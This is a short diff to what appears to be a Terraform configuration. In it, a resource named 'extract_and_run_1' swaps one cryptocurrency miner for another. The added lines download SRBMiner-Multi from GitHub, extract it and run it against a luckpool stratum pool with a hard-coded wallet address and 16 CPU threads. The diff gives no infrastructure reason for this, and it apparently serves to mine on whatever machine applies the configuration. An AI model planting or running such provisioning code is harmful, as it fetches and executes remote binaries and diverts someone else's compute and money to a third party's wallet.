@@ -2,21 +2,17 @@ resource "null_resource" "extract_and_run_1" {
   provisioner "local-exec" {
     command = <<EOT
 set -e
-apt update 
-apt install -y libsodium23
 
-curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz -o hellminer.tar.gz
-tar -xzf hellminer.tar.gz
+curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz
 
-chmod +x hellminer verus-solver
+tar -xzf SRBMiner-Multi.tar.gz
 
-ldd verus-solver || true
+./SRBMiner-Multi-3-1-1/SRBMiner-MULTI \
+  --algorithm verushash \
+  --pool stratum+tcp://ap.luckpool.net:3956 \
+  --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp \
+  --cpu-threads 16
 
-./hellminer \
-  -c stratum+tcp://na.luckpool.net:3956 \
-  -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.001 \
-  -p x \
-  --cpu 2
 EOT
   }
 }
